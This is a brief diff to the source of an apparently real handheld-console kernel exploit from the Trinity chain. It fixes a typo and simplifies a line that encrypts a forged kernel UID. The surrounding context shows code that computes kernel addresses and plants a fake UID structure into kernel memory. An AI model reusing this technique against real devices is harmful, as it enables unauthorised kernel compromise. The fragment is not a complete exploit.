@@ -20,7 +20,7 @@
 SceUID kernel exploit by qwikrazor87.
 Read only kernel exploit by TheFl0w.
 Part of Trinity exploit chain.
-Put toguether by Acid_Snake and meetpatty.
+Put together by Acid_Snake and meetpatty.
 */
 
 
@@ -134,7 +134,7 @@ int doExploit(void) {
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
     SceUID uid = ((((dummyaddr - FAKE_UID_OFFSET) & 0x00ffffff) >> 2) << 7) | 0x1;
-    SceUID encrypted_uid = seed != 0 ? uid ^ seed : uid;
+    SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
